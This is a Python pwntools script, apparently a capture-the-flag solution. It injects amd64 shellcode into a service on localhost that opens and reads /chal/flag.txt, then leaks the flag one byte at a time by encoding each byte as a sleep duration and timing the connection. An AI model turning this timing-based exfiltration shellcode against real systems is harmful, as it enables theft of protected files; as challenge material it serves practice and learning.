#!/usr/bin/env python3

import math
import time
from pwn import *

context.arch = 'amd64'


def generate_shellcode(i):
    shellcode = shellcraft.openat(-1, '/chal/flag.txt')
    shellcode += shellcraft.read('rax', 'rsp', 64)

    if i == 0xa:
        shellcode += f'''
        mov rdx, 9
        inc rdx
        '''
    else:
        shellcode += f'''
        mov rdx, {i}
        '''
    shellcode += '''
    mov al, byte [rsp + rdx]
    '''

    # struct timespec {
    #   .tv_sec  = byte [rsp + i] / 10
    #   .tv_nsec = (byte [rsp + i] % 10) * 100000000
    # }
    shellcode += '''
    mov rbx, 9; inc rbx
    xor rdx, rdx
    div rbx
    mov rbx, rax
    mov rax, 100000000
    mul rdx
    push rax
    push rbx
    '''

    shellcode += shellcraft.nanosleep('rsp', 0)
    shellcode += shellcraft.exit(0)

    return shellcode


def get_char_at(i):
    shellcode = generate_shellcode(i)

    r = remote('localhost', 1337)
    r.readuntil(b'> ')

    start_time = time.time()
    r.writeline(asm(shellcode))
    r.readall()

    time_taken = time.time() - start_time 
    r.close()

    log.info(f'time_taken = {time_taken}s')
    result = chr(math.floor(time_taken * 10))
    log.info(f'flag[{i}] = "{result}"')

    return result


flag = ''.join([get_char_at(i) for i in range(44)])
log.success(f'flag = "{flag}"')
